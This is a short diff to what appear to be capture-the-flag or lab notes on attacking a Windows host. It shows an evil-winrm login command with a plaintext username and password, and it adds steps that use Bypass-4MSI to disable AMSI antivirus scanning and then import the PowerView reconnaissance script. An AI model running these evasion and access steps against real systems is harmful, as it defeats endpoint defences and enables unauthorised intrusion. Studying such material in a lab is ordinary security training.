@@ -23,6 +23,10 @@ Log in with valid creds:
 
 `evil-winrm -i 10.129.217.3 -u 'tony' -p 'liltony'
 
+Bypass-4MSI: patchs AMSI protection. To get around This script contains malicious content and has been blocked by your antivirus software error:
+
+`Bypass-4MSI
+`Import-Module C:\Users\e.black\Documents\PowerView.ps1
 
 ___
 
